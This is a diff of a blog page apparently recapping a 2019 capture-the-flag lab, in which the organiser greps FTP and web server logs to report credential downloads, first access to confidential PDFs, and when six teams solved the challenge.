-Fri Apr  5 22:47:23 2019 [pid 1659] [backup] OK LOGIN: Client &quot;::ffff:10.0.0.1&quot;
-Fri Apr  5 22:47:38 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10.0.0.1&quot;, &quot;/TODO.txt&quot;, 80 bytes, 1.33Kbyte/sec
-Fri Apr  5 22:47:52 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10.0.0.1&quot;, &quot;/kanban.png&quot;, 130540 bytes, 2123.12Kbyte/sec
-Fri Apr  5 22:47:54 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10.0.0.1&quot;, &quot;/kanban2.png&quot;, 35776 bytes, 3169.80Kbyte/sec
-Fri Apr  5 22:48:15 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10.0.0.1&quot;, &quot;/credentials.tar.gz&quot;, 304 bytes, 5.21Kbyte/sec
+<pre tabindex="0"><code>root@admin-server:~# cat full-vstfpd.log | grep &#34;OK&#34;
+Fri Apr  5 22:47:04 2019 [pid 1656] [backup] OK LOGIN: Client &#34;::ffff:10.0.0.1&#34;
+Fri Apr  5 22:47:23 2019 [pid 1659] [backup] OK LOGIN: Client &#34;::ffff:10.0.0.1&#34;
+Fri Apr  5 22:47:38 2019 [pid 1661] [backup] OK DOWNLOAD: Client &#34;::ffff:10.0.0.1&#34;, &#34;/TODO.txt&#34;, 80 bytes, 1.33Kbyte/sec
+Fri Apr  5 22:47:52 2019 [pid 1661] [backup] OK DOWNLOAD: Client &#34;::ffff:10.0.0.1&#34;, &#34;/kanban.png&#34;, 130540 bytes, 2123.12Kbyte/sec
+Fri Apr  5 22:47:54 2019 [pid 1661] [backup] OK DOWNLOAD: Client &#34;::ffff:10.0.0.1&#34;, &#34;/kanban2.png&#34;, 35776 bytes, 3169.80Kbyte/sec
+Fri Apr  5 22:48:15 2019 [pid 1661] [backup] OK DOWNLOAD: Client &#34;::ffff:10.0.0.1&#34;, &#34;/credentials.tar.gz&#34;, 304 bytes, 5.21Kbyte/sec
 </code></pre><h2 id="number-of-credentials-download">Number of credentials download</h2>
 <p>Encrypted credentials have been only downloaded <strong>20 times</strong></p>
-<pre tabindex="0"><code>root@admin-server:~# cat full-vstfpd.log | grep &quot;/credentials.tar.gz&quot; | wc -l
+<pre tabindex="0"><code>root@admin-server:~# cat full-vstfpd.log | grep &#34;/credentials.tar.gz&#34; | wc -l
 20
 </code></pre><h2 id="first-reading-of-confidential-documents">First reading of confidential documents</h2>
 <p>The first challenger stole confidential documents at <code>11:05pm</code>. He also validated the challenge in same time.</p>
-<pre tabindex="0"><code>root@admin-server:~# cat full-access.log | grep -E &quot;*.pdf&quot; | grep &quot; 200 &quot;
-10.0.0.1 - admin [05/Apr/2019:23:05:25 +0200] &quot;GET /cv1.pdf HTTP/1.1&quot; 200 46462 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
-10.0.0.1 - admin [05/Apr/2019:23:05:26 +0200] &quot;GET /cv2.pdf HTTP/1.1&quot; 200 250556 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
-10.0.0.1 - admin [05/Apr/2019:23:05:40 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
+<pre tabindex="0"><code>root@admin-server:~# cat full-access.log | grep -E &#34;*.pdf&#34; | grep &#34; 200 &#34;
+10.0.0.1 - admin [05/Apr/2019:23:05:25 +0200] &#34;GET /cv1.pdf HTTP/1.1&#34; 200 46462 &#34;http://10.0.0.3/index.php&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&#34;
+10.0.0.1 - admin [05/Apr/2019:23:05:26 +0200] &#34;GET /cv2.pdf HTTP/1.1&#34; 200 250556 &#34;http://10.0.0.3/index.php&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&#34;
+10.0.0.1 - admin [05/Apr/2019:23:05:40 +0200] &#34;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&#34; 200 14506 &#34;http://10.0.0.3/index.php&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&#34;
 </code></pre><h2 id="challenge-validations">Challenge validations</h2>
 <p>The challenge was validated by 6 teams at :</p>
 <ul>
@@ -541,14 +540,14 @@ Fri Apr  5 22:48:15 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10
 <li>03:30am</li>
 <li>04:40am</li>
 </ul>
-<pre tabindex="0"><code>root@admin-server:~# cat full-access.log | grep &quot;273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74&quot; | grep &quot; 200 &quot;
+<pre tabindex="0"><code>root@admin-server:~# cat full-access.log | grep &#34;273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74&#34; | grep &#34; 200 &#34;
 
-10.0.0.1 - admin [05/Apr/2019:23:05:40 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
-10.0.0.1 - admin [05/Apr/2019:23:16:12 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;-&quot; &quot;curl/7.64.0&quot;
-10.0.0.1 - admin [06/Apr/2019:01:40:06 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/trybu.pdf HTTP/1.1&quot; 200 14285 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;
-10.0.0.1 - admin [06/Apr/2019:03:14:40 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;
-10.0.0.1 - admin [06/Apr/2019:03:30:48 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;http://10.0.0.3/index.php&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0&quot;
-10.0.0.1 - admin [06/Apr/2019:04:40:41 +0200] &quot;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&quot; 200 14506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;
+10.0.0.1 - admin [05/Apr/2019:23:05:40 +0200] &#34;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&#34; 200 14506 &#34;http://10.0.0.3/index.php&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&#34;
+10.0.0.1 - admin [05/Apr/2019:23:16:12 +0200] &#34;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&#34; 200 14506 &#34;-&#34; &#34;curl/7.64.0&#34;
+10.0.0.1 - admin [06/Apr/2019:01:40:06 +0200] &#34;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/trybu.pdf HTTP/1.1&#34; 200 14285 &#34;http://10.0.0.3/index.php&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&#34;
+10.0.0.1 - admin [06/Apr/2019:03:14:40 +0200] &#34;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&#34; 200 14506 &#34;-&#34; &#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0&#34;
+10.0.0.1 - admin [06/Apr/2019:03:30:48 +0200] &#34;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&#34; 200 14506 &#34;http://10.0.0.3/index.php&#34; &#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0&#34;
+10.0.0.1 - admin [06/Apr/2019:04:40:41 +0200] &#34;GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1&#34; 200 14506 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0&#34;
 </code></pre><h1 id="final-timeline">Final timeline</h1>
 <p><img src="/img/hacklab-esgi-2019/timeline.png" alt=""></p>
 <h1 id="conclusion">Conclusion</h1>
@@ -587,7 +586,7 @@ Fri Apr  5 22:48:15 2019 [pid 1661] [backup] OK DOWNLOAD: Client &quot;::ffff:10
 		</ul>
 	</div>
 
-	<p>&copy; 2022. All rights reserved.</p>
+	<p>&copy; 2024. All rights reserved.</p>
 </div>
     </div>
   </div>
